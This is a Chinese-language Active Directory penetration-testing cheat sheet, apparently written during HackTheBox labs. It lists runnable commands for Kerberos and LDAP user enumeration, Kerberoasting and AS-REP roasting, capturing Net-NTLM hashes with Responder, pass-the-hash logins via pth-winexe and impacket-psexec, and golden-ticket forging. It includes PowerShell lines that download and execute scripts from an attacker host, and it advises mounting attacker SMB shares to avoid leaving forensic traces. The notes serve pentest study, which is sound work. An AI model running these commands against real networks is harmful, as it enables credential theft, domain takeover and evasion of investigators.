
攻击思路，首先是获取凭证和NTLM hash值。

## Kerberoasting

Kerberos 是一种在 Windows Active Directory 环境中使用的身份验证协议。



### Kerberos用户枚举

枚举域内用户列表

```bash
nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='<domain>'" <ip>
```

增加任意字段二次枚举

```bash
nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='<domain>'",userdb=./SecLists/Usernames/Names/names.txt <ip>
```



### LDAP服务枚举

```bash
ldapsearch -h <ip> -p 389 -x -b 'dc=<dc>,dc=<dc>' | more
```

查询所有域用户:

`-b 'dc=htb,dc=local' "(&(objectClass=user)(objectCategory=person))"`



所有计算机:

`-b 'dc=htb,dc=local' "(&(objectCategory=computer)(objectClass=computer))"`



所有组:

`-b 'dc=htb,dc=local' "(&(objectCategory=group))"`



### Kerbero asting 攻击

使用 impacket-GetUserSPNs 匿名查询下域内帐户的 SPN。

使用 GetNPUsers 来查询域控中不需要Kerberos预认证的用户。



### SMB欺骗获取凭证

由于 SMB、HTTP、LDAP、MSSQL 等协议都可以携带 NTLM 认证的三类消息，所以只要是使用 SMB、HTTP、LDAP、MSSQL 等协议来进行 NTLM 认证的程序，都可以尝试向攻击者发送 Net-NTLMhash 从而让攻击者截获用户的 Net-NTLMhash，也就是说我们可以通过这些协议来进行攻击。

```bash
kali: $ python3 Responder -wrf --lm -v -I eth0

kali: $ responder -wrf --lm -v -I tun0
```

### 域环境信息收集

```bash
# SPN查询
C:\\Windows\\Temp>setspn -q */*

Invoke-WebRequest "http://<kali>/Get-SPN.psm1" -OutFile "Get-SPN.psm1"
Import-Module .\Get-SPN.psm1
Get-SPN -type service -search "*" -List yes | Format-Table

Invoke-WebRequest "http://<kali>/PowerView.ps1" -OutFile "PowerView.ps1"
Import-Module .\PowerView.ps1
Get-NetUser -SPN

# 导出凭证
IEX (New-Object Net.WebClient).DownloadString('http://<kali>/Invoke-Kerberoast.ps1')
Invoke-Kerberoast -outputFormat Hashcat

# kirbi2 凭证转 hashcat
https://raw.githubusercontent.com/jarilaos/kirbi2hashcat/master/kirbi2hashcat.py
python kirbi2hashcat.py <path_name>.kirbi > krb5tgs_hash
```



### NTLM (Pass The Hash)

Pass The Hash 哈希传递简称PTH，可以在不需要明文密码的情况下，利用LM HASH和NTLM HASH直接远程登录。攻击者不需要花费时间来对hash进行爆破，在内网渗透里非常经典。
常常适用于域/工作组环境。

psexec 类工具原理是：通过ipc$连接，将psexesvc.exe释放到目标机器，再通过服务管理SCManager远程创建psexecsvc服务，并启动服务。然后通过psexec服务运行命令，运行结束后删除该服务。
如：Metasploit psexec，Impacket psexec，pth-winexe，Empire Invoke-Psexec

```bash
pth-winexe -U <hostname>/administrator //<IP> cmd.exe
pth-winexe -U <hostname>/administrator%hash:has //<IP> cmd.exe

impacket-psexec -hashes hash:has administrator@<IP>
impacket-psexec <domain>/SQLServer:<user>@<IP> powershell
```

### 中继欺骗攻击

当我们想尝试NTLM中继时，第一时间要做的是检查对方是否有开始SMB签名！默认不开启，但是域控默认开启！
可以用 Responde r配套的 RunFinger.py 脚本来进行扫描(NMAP也可以)。

### 金票

https://attack.stealthbits.com/how-golden-ticket-attack-works



```bash
$ impacket-ticketer -nthash <hash> -domain-sid <S-ID> -domain htb.local test001
$ export KRB5CCNAME=/home/kali/hackthebox/Forest/file/test001.ccache
$ impacket-psexec htb.local/test001@<IP> -k -no-pass
```

### 术语解析

内网攻击术语：`AS-REP Roasting`， 属于kerberos协议的攻击，获取用户hash然后离线暴力破解。攻击方式利用比较局限，因为其需要用户账号设置 "Do not require Kerberos preauthentication(不使用Kerberos预认证) "

`AS-REP Roasting` 、`Kerberoasting` 和 `黄金票据` 的区别：

```

简单的方式来解释一下：
- AS-REP Roasting：获取用户hash然后离线暴力破解
- Kerberoasting：获取应用服务hash然后暴力破解
- 黄金票据：通过假冒域中不存在的用户来访问应用服务
```

利用 rpcclient 匿名访问查询用户、用户所属组信息等，也可以直接用 `enum4linux`。

```bash

# 匿名访问
rpcclient -U "" -N <IP>

# 获取所有用户
rpcclient $> enumdomusers

# 获取权限列表
rpcclient $> enumprivs

# 获取域信息
rpcclient $> enumdomains

# 获取域的组信息
rpcclient $> enumdomgroups

# 枚举 AD 林中的所有受信任域
rpcclient $> dsenumdomtrusts

```

GetNPUsers 在运行匿名访问的时候不需要输入用户名，也可以拿到凭证：`$ impacket-GetNPUsers -dc-ip <IP> -request "htb.local/"`

`impacket-smbserver` 除了可以用来临时开 `smbserver` 进行copy的操作，还能通过 powershell 来挂载它，这样做我们的脚本将不会在目标服务落地，也是防溯源的一个技巧：

**不带身份认证启动后直接直接挂载：**

`PS> New-PSDrive -Name "<ShareName>" -PSProvider "FileSystem" -Root "\\<attackerIP>\<ShareName>`

**带身份认证的挂载：**

`$ impacket-smbserver <shareName> $(pwd) -smb2support -username <user> -password <password>`

`PS> $pass = ConvertTo-SecureString '<password>' -AsPlainText -Force`

`PS> $cred = New-Object System.Management.Automation.PSCredential('<user>', $pass)`

`PS> New-PSDrive -Name "<ShareName>" -PSProvider "FileSystem" -Root "\\<attackerIP>\<ShareName> -Credential $cred`

--------

* NTLM Hash：存储在SAM数据库及NTDS数据库中对密码进行 Hash摘要计算后的结果
* Net-NTLM hash：通常是指网络环境下 NTLM认证中的 Hash
* NTLM：除 Kerberos之外的一种网络认证协议，只支持 Windows
* LSASS：Windows系统的安全机制（系统进程）。用于本地安全和登陆策略


## ZeroLogon(CVE-2020-1472)

- https://xz.aliyun.com/t/8367
- https://www.cnblogs.com/Mikasa-Ackerman/p/CVE20201472.html

----

## 参考

- Pentesting_Active_directory https://www.xmind.net/m/5dypm8/#
